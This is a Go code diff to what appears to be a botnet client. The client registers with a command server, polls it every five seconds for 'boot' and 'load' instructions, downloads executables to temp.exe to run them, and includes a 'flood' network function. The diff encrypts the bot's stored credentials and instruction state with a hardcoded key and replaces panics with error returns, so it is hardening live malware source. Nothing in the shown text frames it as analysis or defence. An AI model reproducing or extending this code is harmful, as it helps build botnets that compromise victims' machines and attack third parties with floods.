@@ -102,12 +102,12 @@ func Decrypt(encrypted string, cipher_key string) (string, error) {
 	}
 
 	if len(cipherText) < aes.BlockSize {
-		panic("cipherText too short")
+		return "", errors.New("cipherText too short")
 	}
 	iv := cipherText[:aes.BlockSize]
 	cipherText = cipherText[aes.BlockSize:]
 	if len(cipherText)%aes.BlockSize != 0 {
-		panic("cipherText is not a multiple of the block size")
+		return "", errors.New("cipherText is not a multiple of the block size")
 	}
 
 	mode := cipher.NewCBCDecrypter(block, iv)
@@ -196,35 +196,52 @@ func checkFile(filePath string) bool {
 	return result
 }
 
-func writeToConfigFile(filePath string, id string, token string) {
+func writeToConfigFile(filePath string, fileKey string, id string, token string) {
 	f, _ := os.Create(filePath)
 
 	defer f.Close()
 
-	f.WriteString(id + ":" + token)
+	var str = id + ":" + token
+	encryptedStr, _ := Encrypt(str, fileKey)
+	f.WriteString(encryptedStr)
 }
 
-func writeToBootFile(filePath string, id string) {
+func writeToBootFile(filePath string, fileKey string, id string) {
 	f, _ := os.Create(filePath)
 
 	defer f.Close()
 
-	f.WriteString(id)
+	encryptedStr, _ := Encrypt(id, fileKey)
+	f.WriteString(encryptedStr)
 }
 
-func readFromConfigFile(filePath string) []string {
+func readFromConfigFile(filePath string, fileKey string) []string {
+	var result []string
 	data, _ := ioutil.ReadFile(filePath)
+	unencrypted, err := Decrypt(string(data), fileKey)
 
-	var fileContents string = string(data)
-	var result []string = strings.Split(fileContents, ":")
+	if err == nil {
+		var fileContents string = string(unencrypted)
+		result = strings.Split(fileContents, ":")
+	} else {
+		result = append(result, "invalid")
+		result = append(result, "invalid")
+	}
 
 	return result
 }
 
-func readFromBootFile(filePath string) string {
+func readFromBootFile(filePath string, fileKey string) string {
+	var result string
 	data, _ := ioutil.ReadFile(filePath)
 
-	var result string = string(data)
+	unencrypted, err := Decrypt(string(data), fileKey)
+
+	if err == nil {
+		result = unencrypted
+	} else {
+		result = "invalid"
+	}
 
 	return result
 }
@@ -426,16 +443,16 @@ func getBootInstructions(apiURL string, sessionKey string, id string, token stri
 	return result
 }
 
-func bootRun(apiURL string, sessionKey string, id string, token string, bootFilePath string) {
+func bootRun(apiURL string, sessionKey string, fileKey string, id string, token string, bootFilePath string) {
 	var bootActive bool = checkBoot(apiURL, id, token)
 
 	if bootActive {
 		var bootInstructions []string = getBootInstructions(apiURL, sessionKey, id, token)
 
-		var savedBootID string = readFromBootFile(bootFilePath)
+		var savedBootID string = readFromBootFile(bootFilePath, fileKey)
 
 		if savedBootID != bootInstructions[1] {
-			writeToBootFile(bootFilePath, bootInstructions[0])
+			writeToBootFile(bootFilePath, fileKey, bootInstructions[0])
 
 			str := bootInstructions[3]
 			t, _ := time.Parse(time.RFC3339, str)
@@ -498,10 +515,11 @@ func flood(connection net.Conn) {
 }
 
 func main() {
-	var bootFilePath string = "boot.txt"
-	var configPath string = "config.txt"
-	var tempLoadFileName string = "temp.exe"
-	var apiURL string = "http://127.0.0.1:5332"
+	var fileKey string = "skdnfhtjgrwnfghserfhiotfdsengdrm" // Hardcoded key for config and boot file encryption
+	var bootFilePath string = "boot.txt"                    // This file keeps an id that tracks what boot instruction the client is executing
+	var configPath string = "config.txt"                    // This is where the client's credidentials are stored
+	var tempLoadFileName string = "temp.exe"                // This is the temporary file use for downloading and running executables
+	var apiURL string = "http://127.0.0.1:5332"             // The server's location
 
 	var apiConnection bool = checkConnection(apiURL)
 
@@ -509,7 +527,7 @@ func main() {
 		var configFileExists bool = checkFile(configPath)
 
 		if configFileExists {
-			var credidentials []string = readFromConfigFile(configPath)
+			var credidentials []string = readFromConfigFile(configPath, fileKey)
 			var credsValidated = checkAccount(apiURL, credidentials[0], credidentials[1])
 
 			if credsValidated {
@@ -520,19 +538,19 @@ func main() {
 
 				for range time.NewTicker(5 * time.Second).C {
 					sessionKey = getSessionKey(apiURL, credidentials[0], credidentials[1])
-					bootRun(apiURL, sessionKey, credidentials[0], credidentials[1], bootFilePath)
+					bootRun(apiURL, sessionKey, fileKey, credidentials[0], credidentials[1], bootFilePath)
 					loadRun(apiURL, sessionKey, credidentials[0], credidentials[1], tempLoadFileName)
 				}
 
 			} else {
 				var newCredidentials []string = registerAccount(apiURL)
-				writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
+				writeToConfigFile(configPath, fileKey, newCredidentials[0], newCredidentials[1])
 				main()
 			}
 
 		} else {
 			var newCredidentials []string = registerAccount(apiURL)
-			writeToConfigFile(configPath, newCredidentials[0], newCredidentials[1])
+			writeToConfigFile(configPath, fileKey, newCredidentials[0], newCredidentials[1])
 			main()
 		}
 
